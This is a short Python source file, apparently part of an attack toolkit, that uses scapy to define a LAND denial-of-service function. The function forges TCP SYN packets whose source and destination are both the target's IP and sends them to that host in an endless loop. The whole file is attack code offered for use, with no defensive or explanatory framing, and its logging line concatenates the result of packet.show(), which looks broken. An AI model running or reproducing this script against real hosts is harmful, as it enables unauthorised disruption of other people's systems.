import os
from scapy.all import *
from time import sleep
import traceback

def LANDDoS(ip,quiet,terminal):
    try:
        packet = IP(src=ip,dst=ip)/TCP(flags='S',sport=134,dport=134)
        terminal.write('\n[+] Sending Packets to '+ip)
        iter = 0
        while True:
            send(packet,verbose=0)
            terminal.write('\n[+] Sent packet\n'+packet.show()+'\n[+] Packet number '+str(iter))
            sleep(2)
            iter += 1
    except Exception as s:
        terminal.write('\n'+str(s))
        traceback.print_exc()
